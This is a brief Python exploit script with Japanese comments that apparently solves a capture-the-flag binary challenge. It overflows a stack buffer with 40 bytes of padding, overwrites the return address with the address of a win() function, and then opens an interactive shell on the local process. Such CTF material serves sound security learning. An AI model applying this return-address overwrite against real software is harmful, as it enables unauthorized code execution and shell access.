#!/usr/bin/env python3
from ptrlib import *

# バイナリの読み込み
elf = ELF("./chall")  # 対象のバイナリ
win_addr = 0x0000000000401157  # win() のアドレス

# オフセットの特定（例: 40バイト + リターンアドレス）
offset = 40

# ペイロードの構築
payload = b"A" * offset  # バッファを埋める
payload += p64(win_addr)  # リターンアドレスを win() で上書き

# プロセス起動
sock = Process("./chall")

# scanf() でペイロードを送信
sock.sendline(payload)

# シェルを奪取
sock.interactive()
